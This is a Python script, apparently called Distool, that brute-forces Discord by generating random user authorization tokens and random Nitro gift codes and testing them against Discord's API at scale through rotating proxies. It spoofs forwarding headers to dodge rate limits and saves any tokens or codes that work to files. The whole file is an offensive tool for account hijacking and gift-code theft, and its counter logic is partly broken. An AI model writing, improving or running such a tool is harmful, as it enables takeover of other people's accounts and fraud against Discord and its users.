import os
import sys
import time
from colorama import Fore
import threading
from requests import Session
from easygui import fileopenbox
import random
import string
from os import mkdir, path, system, name
import requests
import base64
import yaml

valid = 0
invalid = 0
limitations = 0
repeat = 0
fail = 0


def title():
    while True:
        global valid
        global invalid
        os.system(f"title Samuel's Nitro Gen Valid : [{valid}]  Invalid : [{invalid}]")


def announcments():
    anno = requests.get("https://gitee.com/samuelwang1/qq8e-information-acquisition/raw/master/Announcement.txt")
    print(f"{Fore.WHITE}{anno.text}")


def nitros():
    global invalid
    global limitations
    global fail
    while True:
        proxy = random.choice(lines)
        if Nitro.proxy_type == "https":
            proxies = {f'https': 'https://%s' % proxy}
        elif Nitro.proxy_type == "socks4" or Nitro.proxy_type == "socks5":
            proxies = {'https': f"{Nitro.proxy_type}//" + proxy}
        gift = "".join(random.choice(characters) for i in range(typeNumber))
        now = time.strftime("%H:%M:%S", time.localtime())
        if Nitro.debug == True:
            print(f"{Fore.CYAN}{now} [?] Testing discord.gift/{gift.upper()}")
        try:
            ass = proxy.split(":")
            header = {
                "X-Forwarded-Port": ass[0],
                "X-Forwarded-For": ass[1]
            }
            r = requests.get(f"https://ptb.discordapp.com/api/v6/entitlements/gift-codes/{gift}", proxies=proxies,
                             timeout=Nitro.timeout)
            if r.status_code == 404:
                print(f"{Fore.RED}{now} [-] discord.gift/{gift.upper()} - Invalid")
                invalid + 1
            elif r.status_code == 429:
                print(f"{Fore.RED}{now} [-] discord.gift/{gift.upper()} - Ratelimited")
                limitations + 1
                invalid + 1
                time.sleep(5)
            elif r.status_code == 200:
                print(f"{Fore.GREEN}{now} [-] discord.gift/{gift.upper()} -Valid Code - Saved to valid.txt")
                f = open("valids.txt", "a")
                valid + 1
                f.write("https://discord.gift/" + gift)
                f.close()
            if Nitro.debug == True:
                print(
                    f"{Fore.RED}{now} Debug Message, reply message{r.text} reply code{r} proxy used{proxy}, gift code{gift}")
        except Exception as e:
            if Nitro.messageDisPlay == True:
                print(f"{Fore.RED}{now} [-] Failed to connect {proxy}")
                if Nitro.debug == True:
                    print(e)
            fail+1
            pass


def func1():
    while True:
        time.sleep(7)
        global limitations
        global valid
        global invalid
        global repeat
        global fail
        now = time.strftime("%H:%M:%S", time.localtime())
        if Nitro.messageDisPlay == False:
            print(
                f"[-]{Fore.GREEN}{now} Confirming alive, invalid tokens:{invalid},valid tokens:{valid},limitations and fails:{limitations+fail} checked total:{invalid + valid}{Fore.RESET}")
            if valid + invalid == valid + invalid:
                repeat = repeat + 1
                if repeat >= 100:
                    print(f"{Fore.CYAN}{now} [+]Auto-Enable: Can't parasing anymore, pausing 120 seconds")
                    time.sleep(120)
            if limitations >= 45:
                print(f"{Fore.CYAN}{now} [+]Auto-Disable: Rate Limit, reqeueing requests. {Fore.RESET}")
                print(f"{Fore.CYAN}{now} [+]Auto-Disable: Rate Limit, reqeueing requests. {Fore.RESET}")
                time.sleep(60)
                print(f"{Fore.CYAN}{now} [+]Restart Completed")
            if fail >= asss * 8:
                input(f"{now} All proxies are invalid. Input to exit")
                sys.exit("All proxies are invalid")
            else:
                pass

def nitro():
    global limitations
    global valid
    global fail
    global invalid
    while (int(count) < int(N)):
        now = time.strftime("%H:%M:%S", time.localtime())
        proxy = random.choice(lines)
        if Nitro.proxy_type == "https":
            proxies = {f'https': 'https://%s' % proxy}
        elif Nitro.proxy_type == "socks4" or Nitro.proxy_type == "socks5":
            proxies = {'https': f"{Nitro.proxy_type}//" + proxy}
        tokens = []
        base64_string = "=="
        while (base64_string.find("==") != -1):
            sample_string = str(random.randint(000000000000000000, 999999999999999999))
            sample_string_bytes = sample_string.encode("ascii")
            base64_bytes = base64.b64encode(sample_string_bytes)
            base64_string = base64_bytes.decode("ascii")
        else:
            token = base64_string + "." + random.choice(string.ascii_letters).upper() + ''.join(
                random.choice(string.ascii_letters + string.digits)
                for _ in range(5)) + "." + ''.join(
                random.choice(string.ascii_letters + string.digits) for _ in range(27))
            tokens.append(token)
        for token in tokens:
            try:
                ass = proxy.split(":")
                header = {
                    "Content-Type": "application/json",
                    "authorization": token,
                    "X-Forwarded-Port": ass[0],
                    "X-Forwarded-For": ass[1],
                }
                r = session.get(url, headers=header, proxies=proxies, timeout=Nitro.timeout)
                if r.status_code == 200:
                    print(f"{Fore.GREEN}{now}[+] Token Works! - {token}")
                    f = open(current_path + "/" + "workingtokens.txt", "a")
                    f.write(token + "\n")
                    valid = valid + 1
                elif r.status_code == 401:
                    if Nitro.messageDisPlay == True:
                        print(f"[-]{Fore.RED}{now} Invalid Token - {token}")
                    else:
                        invalid = invalid + 1
                else:
                    limitations + 1
            except Exception as e:
                if Nitro.messageDisPlay == True:
                    print(f"{Fore.RED}{now}[-] Failed to connect {proxy}")
                    if Nitro.debug == True:
                        print(e)
                fail+1
                pass

        tokens.remove(token)


default_values = """#       ██████╗░██╗░██████╗████████╗░█████╗░░█████╗░██╗░░░░░
#       ██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
#       ██║░░██║██║╚█████╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░
#       ██║░░██║██║░╚═══██╗░░░██║░░░██║░░██║██║░░██║██║░░░░░
#       ██████╔╝██║██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗
#       ╚═ ════╝░╚═╝╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝
#
#       -Created and Coded By Samuel Wang
#       -Code Revised and Cleaned By Samuel Wang
#       -Setting File for project.Free Nitro
#       -Contact Senior#9999 For any assistence

Nitro:
  #Message Display or not?
  messageDisPlay: true

  #Do you wanna look at the annoucnments?
  announce_check: false

  #Do you need the newest version, I think you will need it!

  check_for_updates: true

  #Debug Options
  Debug: false

  #How many threads you want
  Threads: 200

  #Nitro type classic or boost
  nitro_type: "classic"

  proxy:

    #do you wanna auto proxy-scrape, the settings of proxy-scrape is going to be pre determined.
    auto_proxy: false

    #proxy api website
    proxy_api_url: None

    #proxy_type,https,socks4,socks5
    proxy_type: "https"

    #proxy timeout 1000ms = 1 sec
    timeout: 150000



"""

if path.exists('Settings.yml'):
    settings = yaml.safe_load(open('Settings.yml', 'r', errors='ignore'))
else:
    open('Settings.yml', 'w').write(default_values)
    settings = yaml.safe_load(open('Settings.yml', 'r', errors='ignore'))



class Nitro:
    announcments_check = bool(settings["Nitro"]["announce_check"])  # No dev
    version_check = bool(settings['Nitro']['check_for_updates'])  # No
    timeout = int(settings['Nitro']["proxy"]['timeout']) / 1000  # Yes
    threads = int(settings['Nitro']['Threads'])  # Yes
    debug = bool(settings['Nitro']['Debug'])  # Yes
    NitroType = str(settings["Nitro"]["nitro_type"])  # Yes
    messageDisPlay = bool(settings["Nitro"]["messageDisPlay"])  # NO
    proxy_type = str(settings["Nitro"]["proxy"]["proxy_type"])

if __name__ == "__main__":
    count = 0
    N = 1000000
    url = "https://discordapp.com/api/v6/users/@me/library"
    characters = string.ascii_letters + string.digits
    current_path = os.path.dirname(os.path.realpath(__file__))
    session = Session()
    if Nitro.announcments_check == True:
        announcments()
    print(f"""{Fore.LIGHTBLUE_EX}
            ██████╗░██╗░██████╗████████╗░█████╗░░█████╗░██╗░░░░░
            ██╔══██╗██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░
            ██║░░██║██║╚█████╗░░░░██║░░░██║░░██║██║░░██║██║░░░░░
            ██║░░██║██║░╚═══██╗░░░██║░░░██║░░██║██║░░██║██║░░░░░
            ██████╔╝██║██████╔╝░░░██║░░░╚█████╔╝╚█████╔╝███████╗
            ╚═════╝░╚═╝╚═════╝░░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝""")
    choice = int(input(
        f"{Fore.CYAN}[+]Input 1 for Discord Token Generator\n[+]Input 2 for Discord Nitro Gift Generator\n{Fore.RESET}"))
    if choice == 1:
        lines = open(fileopenbox(title="Load Proxy List", default="*.txt"), 'r', encoding="utf8",
                     errors='ignore').read().splitlines()
        print(f"{Fore.RED}Distool is now archived\n{Fore.RESET}")
        asss = len(lines)
        threading.Thread(target=func1).start()
        for i in range(Nitro.threads):
            threading.Thread(target=nitro).start()
            time.sleep(0.1)
    elif choice == 2:
        lines = open(fileopenbox(title="Load Proxy list", default="*.txt"), 'r', encoding="utf8",
                     errors='ignore').read().splitlines()
        if Nitro.NitroType == "classic":
            typeNumber = 16
        elif Nitro.NitroType == "boost":
            typeNumber = 24
        else:
            print("Please input a valid number")
            sys.exit()
        for i in range(Nitro.threads):
            threading.Thread(target=nitros).start()
            time.sleep(0.1)
        print(f"{Fore.CYAN}[+] Threading Completed{Fore.RESET}")
